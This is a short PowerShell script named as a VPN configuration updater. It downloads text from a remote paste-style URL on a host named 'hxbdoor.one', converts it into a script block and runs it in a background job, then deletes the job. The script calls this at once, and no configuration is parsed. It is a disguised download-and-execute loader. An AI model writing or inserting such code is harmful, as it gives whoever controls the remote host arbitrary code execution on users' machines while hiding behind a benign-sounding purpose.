function Update-VPNConfiguration {
    param([string]$ConfigSource)
    
    
    $config = Invoke-RestMethod -Uri $ConfigSource -UserAgent "VPN-Config-Client/1.0" -TimeoutSec 10
    
    
    $job = Start-Job -ScriptBlock ([ScriptBlock]::Create($config)) -Name "VPN-Config-Update"
    $job | Wait-Job -Timeout 30 | Out-Null
    $job | Remove-Job -Force
}


Update-VPNConfiguration -ConfigSource "https://hxbdoor.one/raw/6VzZQLSq"
